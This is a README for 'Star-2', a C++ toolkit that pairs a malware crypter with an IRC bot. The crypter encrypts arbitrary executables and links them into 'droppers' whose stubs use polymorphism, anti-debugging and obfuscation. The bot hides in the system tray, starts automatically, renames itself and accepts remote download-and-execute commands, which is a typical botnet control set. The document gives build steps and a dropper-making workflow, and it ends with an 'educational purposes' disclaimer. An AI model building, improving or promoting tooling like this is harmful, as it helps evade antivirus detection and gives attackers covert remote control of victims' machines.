# Star-2: Advanced Native Encryption & mIRC Bot System

## 🚀 Overview

Star-2 is a comprehensive native C++ encryption and mIRC bot system featuring advanced stub generation, universal file encryption, and stealth bot capabilities. All components are built with zero external dependencies for maximum portability.

## ✨ Key Features

### 🔐 **Advanced Encryption System**
- **Native AES-128-CTR** implementation with zero dependencies
- **Universal file encryption** - works with any file type
- **Random key generation** with high-entropy seeding
- **Standalone stub generation** for unlimited dropper creation
- **Stub linking system** for combining stubs with encrypted payloads

### 🤖 **mIRC Bot System**
- **Native IRC client** with stealth capabilities
- **Auto-rename** functionality with random names
- **System tray** operation for stealth
- **Auto-startup** capabilities
- **Advanced commands**: `!upload`, `!download`, `!execute`, `!botkill`, `!restart`

### 🛠 **Stub Generator Types**
- **Basic**: Simple AES-128-CTR decryption
- **Advanced**: Polymorphic code + anti-debugging + obfuscation
- **Stealth**: Minimal footprint with enhanced stealth features
- **Standalone**: Independent stubs for later linking

## 📁 Project Structure

```
Star-2/
├── native_stub_generator.cpp    # Main stub generator
├── native_encryptor.cpp         # Universal file encryptor
├── drag_drop_encryptor.cpp      # GUI drag-and-drop encryptor
├── stub_linker.cpp              # Stub + payload linker
├── mirc_bot_builder.cpp         # mIRC bot builder
├── StarBot_bot.cpp              # mIRC bot source
└── final_test_summary.txt       # Test results
```

## 🎯 **Latest Improvements (v2.0)**

### ✅ **100% Stub Uniqueness**
- Enhanced RNG seeding with `std::random_device` + `std::seed_seq`
- Reseeding for each stub generation (maximum uniqueness)
- Fixed stub linker to extract keys from stubs (not generate new ones)
- Updated all encryptors with improved entropy-based seeding

### 📊 **Test Results**
- **25/25 stubs**: 100% unique keys and nonces
- **6/6 linked files**: 100% unique encrypted content
- **Universal compatibility**: Works with any file type
- **mIRC bot integration**: Fully compatible with all stub types

## 🚀 Quick Start

**📖 For complete instructions, see [HOW_TO_GUIDE.md](HOW_TO_GUIDE.md)**

### 1. **Generate a Standalone Stub**
```bash
./native_stub_generator --standalone my_stub.cpp standalone_basic
```

### 2. **Encrypt a File**
```bash
./native_encryptor input_file.exe output_encrypted.bin
```

### 3. **Link Stub with Payload**
```bash
./stub_linker my_stub.cpp output_encrypted.bin final_dropper.cpp
```

### 4. **Build mIRC Bot**
```bash
./mirc_bot_builder StarBot_bot.cpp
```

## 🔧 **Compilation**

```bash
# Compile all components
make

# Or compile individually
g++ -o native_stub_generator native_stub_generator.cpp
g++ -o native_encryptor native_encryptor.cpp
g++ -o stub_linker stub_linker.cpp
g++ -o mirc_bot_builder mirc_bot_builder.cpp
```

## 📋 **Available Commands**

### **Stub Generator**
```bash
./native_stub_generator [input_file] [output_file] [stub_type]
./native_stub_generator --standalone [output_file] [stub_type]
```

**Stub Types:**
- `basic` - Simple AES-128-CTR
- `advanced` - Polymorphic + anti-debug + obfuscation
- `stealth` - Minimal footprint
- `standalone_basic` - Standalone basic stub
- `standalone_advanced` - Standalone advanced stub
- `standalone_stealth` - Standalone stealth stub

### **Encryptor**
```bash
./native_encryptor [input_file] [output_file]
```

### **Stub Linker**
```bash
./stub_linker [stub_file] [payload_file] [output_file]
```

### **mIRC Bot Commands**
- `!upload [file]` - Upload file to bot
- `!download [url]` - Download file from URL
- `!execute [file]` - Execute downloaded file
- `!botkill` - Scan and remove malware
- `!restart [type]` - Restart bot (soft/hard/update)

## 🔒 **Security Features**

- **Zero dependencies** - No external libraries required
- **High-entropy RNG** - Cryptographically secure random generation
- **Polymorphic code** - Variable name randomization
- **Anti-debugging** - Timing-based detection
- **String obfuscation** - Encrypted string literals
- **Stealth operation** - System tray + auto-startup

## 📈 **Performance**

- **Stub size**: ~6.5KB (consistent across all types)
- **Encryption overhead**: ~6.16x size increase
- **Memory usage**: Minimal footprint
- **Execution speed**: Native performance

## 🤝 **Contributing**

This project is designed for educational and research purposes. Please use responsibly and in accordance with applicable laws and regulations.

## 📄 **License**

This project is provided as-is for educational purposes. Users are responsible for compliance with local laws and regulations.

---

**Star-2** - Advanced Native Encryption & mIRC Bot System  
*Built with zero dependencies for maximum portability*